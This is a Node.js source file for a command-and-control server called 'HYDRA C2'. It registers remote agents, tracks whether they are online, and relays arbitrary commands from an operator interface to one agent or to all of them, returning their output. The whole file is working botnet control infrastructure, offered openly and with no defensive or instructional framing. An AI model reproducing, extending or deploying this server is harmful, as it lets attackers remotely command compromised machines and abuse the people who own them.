
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');

const app = express();
app.use(cors());

app.get('/', (req, res) => { res.send('HYDRA C2 v105.2 [STABLE]'); });

const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" } });

// Store agents in memory
let agents = []; 

io.on('connection', (socket) => {
    console.log('[+] New Connection:', socket.id);

    socket.on('identify', (data) => {
        if (data.type === 'ui') {
            socket.join('ui_room');
            socket.emit('agents_list', agents);
        } else {
            // Check if agent ID already exists to prevent duplicates
            const existingIndex = agents.findIndex(a => a.id === data.id);
            
            if (existingIndex > -1) {
                // Update existing agent
                agents[existingIndex].socketId = socket.id;
                agents[existingIndex].status = 'Online';
                agents[existingIndex].lastSeen = Date.now();
                console.log('[*] Agent Reconnected:', data.id);
            } else {
                // Add new agent
                agents.push({ 
                    ...data, 
                    socketId: socket.id, 
                    status: 'Online', 
                    lastSeen: Date.now() 
                });
                console.log('[+] New Agent Registered:', data.id);
            }
            io.to('ui_room').emit('agents_list', agents);
        }
    });

    socket.on('exec_cmd', (data) => {
        const { targetId, cmd } = data;
        console.log(`[CMD] ${cmd} -> ${targetId}`);
        
        // Broadcast to UI so user sees the command was sent
        io.to('ui_room').emit('agent_event', {
            type: 'INFO',
            agentId: 'C2_CORE',
            payload: `Command Sent: ${cmd}`
        });

        if (targetId === 'all') {
            socket.broadcast.emit('exec_cmd', { cmd });
        } else {
            const target = agents.find(a => a.id === targetId);
            if (target) {
                io.to(target.socketId).emit('exec_cmd', { cmd });
            }
        }
    });
    
    socket.on('agent_event', (data) => {
        // Forward logs from agents to UI
        io.to('ui_room').emit('agent_event', data);
    });

    socket.on('disconnect', () => {
        const agent = agents.find(a => a.socketId === socket.id);
        if (agent) { 
            agent.status = 'Offline'; 
            io.to('ui_room').emit('agents_list', agents);
            console.log('[-] Agent Offline:', agent.id);
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`HYDRA C2 LISTENING ON PORT ${PORT}`));
